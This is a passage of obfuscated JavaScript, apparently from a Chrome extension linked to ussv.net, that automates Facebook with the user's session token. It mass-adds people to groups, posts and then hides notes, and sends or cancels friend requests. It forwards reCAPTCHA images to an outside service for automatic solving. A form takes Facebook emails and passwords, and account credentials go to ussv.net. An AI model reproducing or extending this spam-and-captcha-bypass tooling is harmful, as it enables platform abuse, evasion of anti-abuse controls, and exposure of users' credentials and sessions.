                    } else if (f1W[W](stt[f1W.o07](), f1W.J9a)) {
                        clearInterval(b0[s0]);
                    } else {
                        var O = parseInt($(f1W.s8Y + D[S] + f1W.S1v + D[u])[f1W.m8y]()),
                            O = O + f1W.S9a;
                        $(f1W.s8Y + D[S] + f1W.S1v + D[u])[f1W.m8y](O);
                    }
                }, f1W.Q8r);
            } else if (f1W[E0](I, f1W.G9a)) {
                $(f1W.V0r)[f1W.p3Q](L + D[S] + f1W.y5I + D[u] + f1W.P7a);
                V0(D);

                function V0(W) {
                    var V = "#max_luong_per_add",
                        E = "g72",
                        O = "D72",
                        Z = '#nowtotal_wait_add_group_',
                        F = "#af_add_group_",
                        o = "a13a",
                        U = "Y72";
                    if (f1W[U](W[f1W.C3y], W[c])) {
                        $(Q + W[S] + f1W.S1v + W[u])[f1W.Q0I](_lJ[f1W.G3v]({
                            "t": f1W.W6I,
                            "id": o
                        }));
                        $(F + W[S] + f1W.S1v + W[u])[f1W.Q0I](_fb[f1W.i0Y](f1W.K9a, W));
                    } else {
                        var p = $(Z + W[S] + f1W.y5I + W[u])[f1W.o07]();
                        if (f1W[O](p, W[f1W.C3y])) {
                            for (var M = f1W.S9a; f1W[E](M, $(V)[f1W.o07]()); M++) {
                                stt = W[f1W.C3y] + M;
                                $(Z + W[S] + f1W.y5I + W[u])[f1W.o07](stt);
                                i0({
                                    "grId": W[u],
                                    "lan": W[c],
                                    "stt": stt,
                                    "FbId": W[S]
                                });
                            }
                        }
                    }
                };

                function i0(b) {
                    var H = "confirmed",
                        R = "l72",
                        X = "C72",
                        f = b[f1W.C3y],
                        n = $("#text_gr_" + b[S] + "_" + b[u] + "_" + f);
                    if (f1W[X]($("#text_gr_" + b[S] + "_" + b[u] + "_" + f).length, 0)) {
                        var Y = "23123123";
                    } else {
                        var Y = n[f1W.o07]()[f1W.F6r](/amp;/g, '');
                    }
                    if (f1W[R](b[H], 1)) {
                        var N = "&confirmed=1";
                        b[H] = 0;
                        var g = "yes";
                    } else {
                        var N = "",
                            g = "no";
                    }
                    pst = 'fb_dtsg=' + _fb[f1W.O00] + '' + Y + '&__user=' + _fb[f1W.z1Y] + '&__a=1' + N;
                    var T = new XMLHttpRequest();
                    T[f1W.g4Y] = function() {
                        var W = "b82",
                            V = "U82",
                            E = "Z82",
                            O = "O82",
                            Z = "V82",
                            F = "Q72",
                            o = "t72",
                            U = "w72",
                            p = "x72";
                        if (f1W[p](T[f1W.D60], 4) && f1W[U](T[f1W.p0O], 200)) {
                            var M = T[f1W.H8v][f1W.F6r]("for (;;);", ""),
                                M = JSON[f1W.i2O](M);
                            if (M.error) {
                                $("#tientrinh_wait_add_group_" + b[S] + "_" + b[u])[f1W.Q0I]("Add Mem Group Error: " + M[f1W.S7Y] + "\n" + M[f1W.m87]);
                                if (f1W[o](M.error, 1357008)) {
                                    b[H] = 1;
                                    i0(b);
                                } else if (f1W[F](M.error, 1390008)) {
                                    b[H] = 0;
                                    $(".invite_gr_" + b[S] + "_" + b[u])[f1W.o07](2);
                                    note = f + "--x";
                                    $("#note_wait_add_group_" + b[S] + "_" + b[u])[f1W.Q0I]("BLOCK");
                                    b[f1W.C3y] = b[c];
                                    V0(b);
                                } else {
                                    b[H] = 0;
                                    $(".invite_gr_" + b[S] + "_" + b[u])[f1W.o07](2);
                                    note = f + "--x";
                                    $("#note_wait_add_group_" + b[S] + "_" + b[u])[f1W.Q0I]("BLOCK");
                                    b[f1W.C3y] = b[c];
                                    V0(b);
                                }
                            } else {
                                n[f1W.w5I]();
                                if (f1W[Z](f, b[c])) {
                                    $(".invite_gr_" + b[S] + "_" + b[u])[f1W.o07](2);
                                    b[J] = "Yes";
                                    _fb[f1W.i0Y](6, b);
                                };
                                note = f + "--x";
                                $("#note_wait_add_group_" + b[S] + "_" + b[u])[f1W.Q0I](_lJ[f1W.G3v]({
                                    "t": "gr",
                                    "id": "a13",
                                    "r": note
                                }));
                                if (f1W[O](g, "yes")) {
                                    setTimeout(function() {
                                        V0(b);
                                    }, 1000);
                                } else {
                                    V0(b);
                                }
                            }
                        } else if (f1W[E](T[f1W.D60], 4) && f1W[V](T[f1W.p0O], 200) && f1W[W](T[f1W.p0O], 500)) {
                            $(".invite_gr_" + b[S] + "_" + b[u])[f1W.o07](2);
                            note = f + "--x";
                            $("#note_wait_add_group_" + b[S] + "_" + b[u])[f1W.Q0I]("ERRO");
                            dom_logs_ussv("L?i k?t n?i ! Vui lòng ki?m tra l?i du?ng truy?n m?ng !", "0|0|_|erros|groups");
                        } else {};
                    };
                    T[f1W.d5y]('POST', '//www.facebook.com/ajax/groups/members/add_post.php?source=dialog_typeahead&group_id=' + b[u] + '&refresh=1', true);
                    T[f1W.h0r](pst);
                };
            } else if (f1W[P](I, f1W.K9a)) {
                url = f1W.d4Y + D[u] + f1W.h3O + D[u] + f1W.y00 + get_Fb_Uid() + f1W.M80;
                data = JSON[f1W.i2O](uss[f1W.G47](url)[f1W.F6r]("for (;;);", ""));
                div_gr = document[f1W.W8O](f1W.W9y);
                div_gr[f1W.V5I] = data[f1W.R1v][f1W.y9X][0][1][f1W.a8Y];
                $(div_gr)[f1W.q8r](f1W.k7O)[f1W.w5I]();
                var J0 = $(div_gr)[f1W.Q0I]()[f1W.F6r](f1W.s60, f1W.m6Q),
                    f0 = $(J0)[f1W.q8r](f1W.e87)[f1W.Q0I]();
                if (f1W[z](D[J], f1W.o3y)) {
                    D[J] = f1W.I8Q;
                }
                return $(div_gr)[f1W.Q0I]();
            } else if (f1W[C](I, f1W.w9a)) {
                data = uss[f1W.G47]("http://ussv.net/ajax/fb_group.php?useracc=" + uss_aut(1) + "&passacc=" + uss_aut(6) + "&type=1&group=2131232");
                data = JSON[f1W.i2O](data)[f1W.F6r]("for (;;);", "");
            } else if (f1W[G](I, f1W.W7a)) {
                k0();

                function k0() {
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/groups/membership/leave.php?group_id=" + D[f1W.G7v],
                        dataType: "json",
                        type: "POST",
                        data: "fb_dtsg=" + D[f1W.O00] + "&confirmed=1&__user=" + D[f1W.z1Y] + "&__a=1"
                    })[f1W.D2I](function(W) {
                        var V = "N82",
                            E = "h82";
                        if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                            N0();
                        }
                    });
                };

                function N0() {
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/groups/membership/r2j.php",
                        dataType: "json",
                        type: "POST",
                        data: "fb_dtsg=" + D[f1W.O00] + "&ref=group_jump_header&group_id=" + D[f1W.G7v] + "&nctr[_mod]=pagelet_group_&__user=" + D[f1W.z1Y] + "&__a=1"
                    })[f1W.D2I](function(W) {
                        var V = "P82",
                            E = "z82";
                        if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                            if (!W.error) {
                                note = D[f1W.G7v] + "--" + D[f1W.z1Y] + "--" + D[f1W.G7v];
                                P0(_lJ[f1W.G3v]({
                                    "t": "gr",
                                    "id": "a8",
                                    "r": note
                                }), "ok");
                                l0(0);
                            }
                        }
                    });
                };

                function l0(W) {
                    var W = W + f1W.S9a;
                    v0(W);
                };

                function v0(R) {
                    var X = _fb[m0](f1W.c9a, D[f1W.p87], K);
                    X[f1W.W6O](function(W) {
                        var V = "E32",
                            E = "W32",
                            O = "FriendData",
                            Z = "d82",
                            F = "K82",
                            o = "L82",
                            U = "S82";
                        if (f1W[U](R, 6)) {
                            if (f1W[o](W.data.length, 0)) {
                                setTimeout(function() {
                                    l0(R);
                                }, 1000);
                            } else {
                                W = JSON[f1W.v4X](W.data);
                                if (f1W[F](W[f1W.x3y]("to join the group"), null) || f1W[Z](W[f1W.x3y]("approved your request"), null)) {
                                    setTimeout(function() {
                                        l0(R);
                                    }, 1000);
                                } else {
                                    var p = D[O];
                                    if (f1W[E](D[f1W.X0v], p.data.length)) {
                                        var M = D[f1W.X0v];
                                    } else {
                                        var M = p.data.length;
                                    }
                                    b = D[f1W.z1Y] + "--" + D[f1W.G7v];
                                    $("#note_wait_ac_group_" + D[f1W.z1Y] + "_" + D[f1W.G7v])[f1W.Q0I](_lJ[f1W.G3v]({
                                        "t": "gr",
                                        "id": "a7",
                                        "r": b
                                    }));
                                    var b = M + "/" + p.data.length + "--" + D[f1W.z1Y] + "--" + D[f1W.G7v];
                                    P0(_lJ[f1W.G3v]({
                                        "t": "gr",
                                        "id": "d1",
                                        "r": b
                                    }), "ok");
                                    acc_doing[f1W.f17] = 0;
                                    for (var H = 0; f1W[V](H, M); H++) {
                                        K0(p.data[H][f1W.l97]);
                                    };
                                }
                            }
                        } else {
                            var b = D[f1W.z1Y] + "--" + D[f1W.G7v];
                            $("#note_wait_ac_group_" + D[f1W.z1Y] + "_" + D[f1W.G7v])[f1W.Q0I](_lJ[f1W.G3v]({
                                "t": "gr",
                                "id": "d2"
                            }));
                        }
                    });
                };

                function K0(E) {
                    var O = "?method=post&access_token=",
                        Z = "/members/",
                        F = f1W.r90 + D[f1W.G7v] + Z + E + O + D[f1W.p87];
                    chrome[f1W.d60][f1W.K4r]({
                        method: 'GET',
                        action: 'xhttp',
                        url: F,
                        data: "hj=hj"
                    }, function(W) {
                        var V = "r32";
                        if (f1W[V](W, "true")) {
                            uss[f1W.H1X]("#groupinvite_TB_" + D[f1W.z1Y] + "_" + D[f1W.G7v]);
                            var W = JSON[f1W.i2O](W);
                        } else {
                            uss[f1W.H1X]("#groupinvite_TC_" + D[f1W.z1Y] + "_" + D[f1W.G7v]);
                        }
                    });
                };

                function P0(W, V) {
                    var E = "|autoAddGr",
                        O = "0|0|_|",
                        Z = "o32";
                    if (f1W[Z](D[f1W.o1Q], f1W.A0r)) {
                        dom_logs_ussv(W, O + V + E);
                    };
                };
            }
        };
        this[f1W.a7y] = function(n, Y) {
            var N = "Create",
                g = "p32",
                T = "Note_Id";

            function I(X) {
                var f = "TieuDe";
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/notes/edit",
                    dataType: "json",
                    type: "POST",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&object_id=" + X[T] + "&note_id=" + X[T] + "&id=" + _fb[f1W.z1Y] + "&title=" + n[f] + "&note_content=" + n[f1W.V5r] + "&audience[" + X[T] + "][value]=80&publish=%C4%90%C4%83ng&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=n"
                })[f1W.D2I](function(O) {
                    var Z = "Create_Hide",
                        F = "a32",
                        o = "NoteCore_LichSu",
                        U = "i32",
                        p = "n32";
                    if (f1W[p](O[f1W.D60], 4) && f1W[U](O[f1W.p0O], 500)) {
                        var O = O[f1W.H8v],
                            O = JSON[f1W.i2O](O[f1W.F6r]("for (;;);", ""));
                        if (O.error) {
                            $(n[f1W.a7y])[f1W.Q0I](O[f1W.m87]);
                            Y({
                                Error: true,
                                "Note": O[f1W.m87]
                            });
                        } else {
                            var M = O[f1W.G0v][0][3][f1W.a8Y];
                            $(n[f1W.a7y])[f1W.Q0I](M);
                            var b = decodeURIComponent("https://facebook.com" + $(M)[f1W.q8r]("a:eq(0)")[f1W.V6Q]("href"));
                            $(".mvm.uiBoxYellow")[f1W.p3Q]("<br/>" + b);
                            var H = new Date(),
                                R = H[f1W.m2Q]() + ":" + H[f1W.Y6v]() + ":" + H[f1W.I8O]() + " Ngày " + H[f1W.t9Y]() + " : ";
                            $("#NoteCore_LichSu")[f1W.u2r]('<div>' + R + '<a target="_blank" href="' + b + '">' + b + '</a></div>');
                            Y({
                                "LinkNote": b,
                                "Note": "T?o Link Note thành công !"
                            });
                            chrome[f1W.v1O][f1W.N0v][f1W.G47](["NoteCore_LichSu"], function(W) {
                                if (W[o]) {
                                    var V = W[o] + b + "--" + R + "|",
                                        E = W[o][f1W.X3Q]("|");
                                } else {
                                    var V = b + "--" + R + "|";
                                }
                                chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                                    "NoteCore_LichSu": V
                                }, function() {});
                            });
                            if (f1W[F](n[Z], 1)) {
                                C(X);
                            };
                        }
                    } else {}
                });
            }

            function D(Z) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/editnote.php",
                    dataType: "json",
                    type: "POST",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&new=1"
                })[f1W.D2I](function(W) {
                    var V = "M32",
                        E = "e32";
                    if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            O = $(W)[f1W.q8r]("input[name=object_id]")[f1W.o07]();
                        $(n[f1W.a7y])[f1W.Q0I]("T?o thành công Note: <a href='http://fb.com/" + O + "' target='_blank'>" + O + "</a> , Ti?n hành c?p nh?t n?i dung...");
                        I({
                            "Note_Id": O
                        });
                    } else {}
                });
            }

            function G(F) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/feed/filter_action/dialog_direct_action",
                    dataType: "json",
                    type: "POST",
                    data: "options_button_id=u_jsonp_7_16&story_location=profile_self&hideable_token=" + F[f1W.p87] + "&story_permalink_token=S:_I" + _fb[f1W.z1Y] + ":" + F[T] + "&initial_action_name=HIDE_FROM_TIMELINE&nctr[_mod]=pagelet_timeline_recent&__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00] + "&ft[tn]=WW&ft[top_level_post_id]=" + F[T] + "&ft[fbfeed_location]=10&ft[thid]=" + _fb[f1W.z1Y] + "&confirmed=1"
                })[f1W.D2I](function(W) {
                    var V = "G32",
                        E = "v32",
                        O = "u32",
                        Z = "c32";
                    if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        if (W.error) {
                            $(".uiBoxYellow")[f1W.q8r](".fsl.fwb.fcb")[f1W.Q0I](W[f1W.m87]);
                        } else {
                            $(".uiBoxYellow")[f1W.q8r](".fsl.fwb.fcb")[f1W.Q0I]("Ðã ?n Ghi chú c?a b?n thành công !");
                        }
                    } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        $(".uiBoxYellow")[f1W.q8r](".fsl.fwb.fcb")[f1W.Q0I]("?n Notes Th?t B?i !");
                    }
                });
            }

            function C(F) {
                $[f1W.c9y]({
                    url: "https://m.facebook.com/story_chevron_menu/?is_menu_registered=false",
                    dataType: "json",
                    type: "POST",
                    data: "feedobjects_identifiers=S:_I" + _fb[f1W.z1Y] + ":" + F[T] + "&feed_context={\"use_m_feed\":true,\"m_entstream_source\":\"timeline\",\"story_node_id\":\"u_0_2d\"}&zombie_story=&story_node_id=u_0_2d&chevron_button_id=u_0_2o&outer_story_token=&m_sess=&fb_dtsg=" + _fb[f1W.O00] + "&__ajax__=true&__user=" + _fb[f1W.z1Y] + ""
                })[f1W.D2I](function(W) {
                    var V = "J32",
                        E = "I32",
                        O = "T32";
                    if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v];
                        if (f1W[V](W[f1W.x3y]("hideable_token=(.*?)story_token"), null)) {
                            var Z = W[f1W.x3y]("hideable_token=(.*?)story_token"),
                                Z = Z[1][f1W.F6r]("&amp;", "");
                            F[f1W.p87] = Z;
                            G(F);
                        } else {
                            $(n[f1W.a7y])[f1W.Q0I]("L?i, không th? ?n Note v?a t?o !");
                        }
                    } else {}
                });
            }
            if (!Y) {
                Y = function() {};
            };
            if (f1W[g](n[f1W.S77], N)) {
                D(n);
            } else {}
        };
        this[g0] = function(Z, F) {
            var o = "AddUid";
            if (!F) {
                var F = function() {};
            }
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/add_friend/action.php",
                type: "POST",
                dataType: "json",
                data: "to_friend=" + Z[o] + "&action=add_friend&how_found=profile_button&ref_param=none&link_data[gt][profile_owner]=" + Z[o] + "&link_data[gt][ref]=timeline:timeline&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data=&http_referer=&floc=profile_button&frefs[0]=none&__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00]
            })[f1W.D2I](function(W) {
                var V = "B62",
                    E = "j62",
                    O = "A32";
                if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v],
                        W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                    if (W[f1W.v6v]) {
                        F({
                            "Note": "G?i yêu c?u k?t b?n d?n " + Z[o] + " Thành Công..."
                        });
                    } else {
                        if (f1W[V](W.error, 1431004)) {
                            F({
                                "Error": true,
                                'Code': 1431004,
                                "Note": "G?i yêu c?u k?t b?n d?n " + Z[o] + " Th?t B?i ! Tài kho?n c?a b?n dã chuy?n sang trang hâm m? !"
                            });
                        } else {
                            F({
                                "Error": true,
                                'Code': W.error,
                                "Note": "G?i yêu c?u k?t b?n d?n " + Z[o] + " Th?t B?i"
                            });
                        }
                    }
                }
            });
        };
        this[Y0] = function(F, o) {
            var U = "UnUid";
            if (!o) {
                var o = function() {};
            }
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/profile/removefriendconfirm.php",
                type: "POST",
                dataType: "json",
                data: "uid=" + F[U] + "&unref=bd_profile_button&floc=profile_button&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00]
            })[f1W.D2I](function(W) {
                var V = "k62",
                    E = "X62",
                    O = "y62",
                    Z = "F62";
                if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v];
                    o({
                        "Note": "H?y k?t b?n thành công..."
                    });
                } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                    o({
                        "Note": "H?y k?t b?n " + F[U] + " Th?t B?i"
                    });
                }
            });
        };
    }

    function str() {
        var l0 = "Chua Ðang Nh?p",
            v0 = "#span_wait_captcha",
            K0 = "#span_wait_captcha_note",
            P0 = "#str_note_alert_captcha",
            Y0 = "#str_auto_captcha",
            g0 = "fb",
            u0 = "#recaptcha_response_field",
            m0 = "rand",
            C0 = "rd_username",
            T0 = "fb_uid",
            M0 = "str_ln|dtxt|",
            I0 = "ln",
            G0 = "str_fn|dtxt|";
        this[f1W.Q57] = uss[f1W.G47](f1W.L9a, G0)[f1W.X3Q](f1W.V6I);
        this[I0] = uss[f1W.G47](f1W.L9a, M0)[f1W.X3Q](f1W.V6I);
        this[f1W.V8I] = f1W.V8v;
        this[T0] = f1W.V8v;
        this[C0] = function() {
            var W = str[f1W.Q57][str[m0](str[f1W.Q57].length)],
                V = str[f1W.Q57][str[m0](str[I0].length)],
                E = W + V + str[m0](5000);
            return E;
        };
        this[m0] = function(W) {
            var V = "H8t",
                E = Math[f1W.n40](f1W[V](Math[f1W.f2I](), W));
            return E;
        };
        this[f1W.d9Q] = function(F, o) {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: o,
                data: "base=hau"
            }, function(W) {
                var V = "N8t",
                    E = "h8t",
                    O = "R8t",
                    Z = "f8t";
                W = JSON[f1W.i2O](W);
                if (f1W[Z](F, 1)) {
                    if (f1W[O](W[f1W.C3y], 1)) {
                        $("#str_note_alert_captcha")[f1W.Q0I](W[f1W.F5v])[f1W.C3O]("color", "rgb(239, 18, 94)");
                    } else {
                        $("#span_wait_captcha_note")[f1W.m8y](W[f1W.F5v]);
                        str[f1W.d9Q](2, W[f1W.j2X]);
                    }
                } else if (f1W[E](F, 2)) {
                    if (f1W[V](W[f1W.C3y], 1)) {
                        $("#str_note_alert_captcha")[f1W.Q0I](W[f1W.F5v])[f1W.C3O]("color", "rgb(239, 18, 94)");
                    } else {
                        $("#str_auto_captcha")[f1W.R4r]();
                        $("#span_wait_captcha")[f1W.v37]();
                        $("#recaptcha_response_field")[f1W.o07](W[f1W.a2Y]);
                        $("#str_note_alert_captcha")[f1W.Q0I](W[f1W.F5v] + "<br/>Captcha còn l?i: " + W[f1W.d9Q])[f1W.C3O]("color", "rgb(33, 199, 85)");
                    }
                };
            });
        };
        this[f1W.e9O] = function(o) {
            var U = "#create_new_email",
                p = "#str_fb_login",
                M = "#str_fb_out",
                b = "#password",
                H = ".col-sm-12:eq(0)",
                R = ".add-email-item",
                X = '<span>',
                f = '	<button id="create_new_email" style="width: auto;">Create</button>',
                n = '     </select>',
                Y = '         <option value="2">imail.faceboolk.net</option>',
                N = '         <option value="1">zl.cityuss.com</option>',
                g = '          <option value="0" selected="">scamvstrust.net</option>',
                T = '	<select id="domain_mail" class="input_mail">',
                I = '	<input style="padding: 2px;" id="new_email" placeholder="New Email" style="width: 20%;"> @ ',
                D = '<span class="str_dom_ussv_email">',
                G = "K8t",
                C = "50%",
                z = ".navbar-header",
                P = '	 <span id="str_wait_fb" class="hidden">',
                J = '	 <span id="str_note_login_fb"></span>',
                c = '	',
                L = '	</span><br/>',
                E0 = '<span class="str_div_fb_info">',
                F0 = '<input id="fb_pass" role="combobox" style="height: auto;" type="password" class="input_mail" placeholder="Pass facebook">',
                K = '<input id="fb_email" role="combobox" style="height: auto;" type="text" class="input_mail" placeholder="Email facebook">',
                r0 = '<button id="str_fb_login" class="">Ðang Nh?p</button>',
                Q = '" target="_blank">',
                S = 'FB: <a href="http://fb.com/',
                u = '<button id="str_fb_out" class="">Ðang Xu?t</button>',
                p0 = "L8t",
                q0 = "S8t",
                H0 = ".input-icon-wrapper",
                W0 = ".col-sm-6:eq(1)",
                w = '<button id="str_dom_random_username" class="" style="position: absolute;right: 0;  top: -28px;width: auto;">Random</button>',
                B0 = "P8t",
                o0 = ".col-sm-6",
                Z0 = '<span id="str_note_alert_captcha"></span>',
                A = ".recaptcha_controls",
                X0 = '<span id="span_wait_captcha" style="display:none;position: relative;bottom: 2px;"><img src="https://ussv.net/themes/img/load_stt.gif"> <span id="span_wait_captcha_note"></span></span>',
                n0 = '    </a>',
                U0 = '        <img id="detail-icon-img" src="https://cdn1.iconfinder.com/data/icons/social-media-set/24/Ustream-16.png" alt="automatic, communication, content-block, creative, grid, outline, paid-service, service, shape, social-media, social-network, ustream, video-stream icon">',
                b0 = '    <a title="Auto" tabindex="-1" id="str_auto_captcha">',
                s0 = '<div class="recaptcha_control recaptcha_ussv_auto">',
                V0 = "z8t";
            if (f1W[V0](o, f1W.L9a)) {
                var i0 = f1W.V8v;
                i0 += s0;
                i0 += b0;
                i0 += U0;
                i0 += n0;
                i0 += f1W.w9O;
                i0 += X0;
                $(A)[f1W.u2r](i0);
                var J0 = Z0;
                $(u0).parent(o0).append(J0);
            } else if (f1W[B0](o, f1W.S9a)) {
                var f0 = f1W.V8v;
                f0 += w;
                $(W0)[f1W.q8r](H0)[f1W.u2r](f0);
            } else if (f1W[q0](o, f1W.c9a)) {
                $(f1W.P80)[f1W.w5I]();
                str[g0](f1W.S9a);
                if (f1W[p0](str[T0], f1W.L9a)) {
                    thaotac = u;
                    info = S + str[T0] + Q + str[f1W.V8I] + f1W.t97;
                } else {
                    thaotac = r0;
                    info = f1W.X6v;
                    info += K;
                    info += F0;
                    info += f1W.X6v;
                }
                var k0 = f1W.V8v;
                k0 += E0;
                k0 += f1W.x0v;
                k0 += f1W.J1v + info;
                k0 += L;
                k0 += c + thaotac;
                k0 += J;
                k0 += P + img_load + f1W.K5O;
                k0 += f1W.K5O;
                $(z)[f1W.C3O](f1W.B5Y, C)[f1W.p3Q](k0);
            } else if (f1W[G](o, f1W.J9a)) {
                var N0 = f1W.X6v;
                N0 += D;
                N0 += I;
                N0 += T;
                N0 += g;
                N0 += N;
                N0 += Y;
                N0 += n;
                N0 += f;
                N0 += X;
                $(R)[f1W.q8r](H)[f1W.u2r](N0);
            }
            $(f1W.S0r)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = ".recaptcha-checkbox,.recaptcha-checkbox-border,.recaptcha-checkbox-borderAnimation,.recaptcha-checkbox-spinner,.recaptcha-checkbox-spinnerAnimation,.recaptcha-checkbox-checkmark,.rc-anchor-checkbox-holder",
                    V = "ng-dirty",
                    E = "ng-pristine",
                    O = "#username";
                rd_username = str[C0]()[f1W.d3v](f1W.L9a, f1W.Y90);
                $(O)[f1W.o07](rd_username);
                $(O)[f1W.X9a](E);
                $(O)[f1W.X5O](V);
                $(W)[f1W.c7v](f1W.E80);
            });
            $(b)[f1W.L0Q](f1W.y1Y)[f1W.y1Y](f1W.d77, function() {
                data = $(this)[f1W.o07]();
                $("#password-confirmation")[f1W.o07](data);
            });
            $(Y0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = "user|captcha|u|?st=1&user=",
                    V = "d8t",
                    E = "USSV-(.*?)-USSV",
                    O = "nguyenhauA1//www.ussv.net",
                    Z = "https://www.google.com/recaptcha/api/image",
                    F = "#recaptcha_challenge_image";
                $(this)[f1W.v37]();
                img = $(F)[f1W.V6Q](f1W.d5v)[f1W.F6r](Z, O);
                dataLogin = document[f1W.w6r][f1W.x3y](E);
                if (f1W[V](dataLogin, f1W.x0r)) {
                    $(P0)[f1W.Q0I](_2l(f1W.h50, f1W.A9a));
                } else {
                    $(K0)[f1W.m8y](_2l(f1W.h50, f1W.G90));
                    $(v0)[f1W.l6Q](f1W.Y5a);
                    dataLogin = dataLogin[f1W.S9a][f1W.X3Q](f1W.j07);
                    str[f1W.d9Q](f1W.S9a, gl[f1W.Y5v](f1W.S9a, W + dataLogin[f1W.L9a] + f1W.d50 + dataLogin[f1W.S9a] + f1W.Q20 + img));
                }
            });
            $(u0)[f1W.L0Q](f1W.h57)[f1W.h57](function(W) {
                var V = ".btn.btn-default",
                    E = "W3t";
                if (f1W[E](W[f1W.b4y], f1W.H90)) {
                    $(V)[f1W.c7v](f1W.E80);
                }
            });
            $(M)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = "setTimeout";
                $(f1W.o1Y)[f1W.R4r]();
                uss[f1W.O1X]();
                str[f1W.V8I] = l0;
                str[T0] = f1W.L9a;
                window[W](function() {
                    $(f1W.P80)[f1W.w5I]();
                    str[f1W.e9O](f1W.c9a);
                }, f1W.T7Q);
            });
            $(p)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = "#fb_pass",
                    V = "#fb_email";
                $(f1W.o1Y)[f1W.R4r]();
                email = $(V)[f1W.o07]();
                pass = $(W)[f1W.o07]();
                data = email + "___" + pass;
                createpopupLogin(data);
            });
            $(U)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = "Ch?c nang này chua du?c kích ho?t !",
                    V = "#new_email";
                new_email = $(V)[f1W.o07]();
                $(f1W.D0Y)[f1W.o07](W);
            });
        };
        this[g0] = function(W, V) {
            var E = "p3t",
                O = "o3t",
                Z = "r3t",
                F = "E3t";
            if (f1W[F](W, f1W.S9a)) {
                data = uss[f1W.G47](3, "https://mbasic.facebook.com/profile.php");
                fb_name = data[f1W.x3y]("<title>(.*?)</title>");
                fb_uid = data[f1W.x3y]("name=\"target\" value=\"(.*?)\" /><input");
                if (f1W[Z](fb_name, f1W.x0r) || f1W[O](fb_uid, f1W.x0r)) {
                    str[f1W.V8I] = l0;
                    str[T0] = f1W.L9a;
                } else {
                    str[f1W.V8I] = fb_name[f1W.S9a];
                    str[T0] = fb_uid[f1W.S9a];
                }
            } else if (f1W[E](W, f1W.c9a)) {}
        };
    }

    function login(E, O) {
        var Z = f1W.r4I + E + f1W.H40 + O;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/ajax/login.php?type=login',
            data: Z
        }, function(W) {
            var V = "L8",
                W = JSON[f1W.i2O](W);
            dom_logs_ussv(W[f1W.F5v], "0|_|_|ok|login");
            if (f1W[V](W[f1W.C3y], 0)) {
                $("#addon_note_login")[f1W.Q0I](W[f1W.F5v]);
                $("#div_pnc_addon")[f1W.w5I]();
                open_div_uss(E, O);
            } else {
                $("#addon_note_login")[f1W.Q0I](W[f1W.F5v]);
                $("#addon_div_login")[f1W.R4r]();
            }
        });
    }

    function thaotac_div_right(p) {
        var M = "#btn_loc",
            b = "#hide_div_loc",
            H = "#div_loc_acc",
            R = "#show_div_loc_acc",
            X = "#show_del_account",
            f = "#hide_div_themacc",
            n = "#div_them_acc",
            Y = "#show_div_them_acc",
            N = "#hide_pnc_right",
            g = "div_pnc_right",
            T = 'div_pnc',
            I = "#div_pnc_right",
            D = "N2t",
            G = function(W) {
                J[f1W.V5I] = W;
            },
            C = function(W) {
                J[f1W.W7O] = W;
            };
        thongbao_log(f1W.S9a, lang_vi_pr_open_log);
        var z = $(f1W.G5Q)[f1W.Q0I]();
        if (f1W[D](z, f1W.B3Q)) {
            get_setting_spam(f1W.G47);
        } else {}
        $(I)[f1W.w5I]();
        var P = document[f1W.C4y](T),
            J = document[f1W.W8O](f1W.P5Y);
        C(g);
        G(p);
        P[f1W.M57](J);
        $(I)[f1W.R4r]();
        $(N)[f1W.Z6O](function() {
            $(I)[f1W.v37]();
            $(f1W.j7O)[f1W.R4r]();
        });
        $(Y)[f1W.Z6O](function() {
            $(Y)[f1W.v37]();
            $(n)[f1W.R4r]();
        });
        $(f1W.I50)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            var W = '<center>Ðang thêm ta`i khoa?n, vui lo`ng cho`...<br/><img src="https://ussv.net/themes/img/loader_2.gif"></center>';
            $(f1W.I50)[f1W.v37]();
            $(f1W.y7Y)[f1W.v37]();
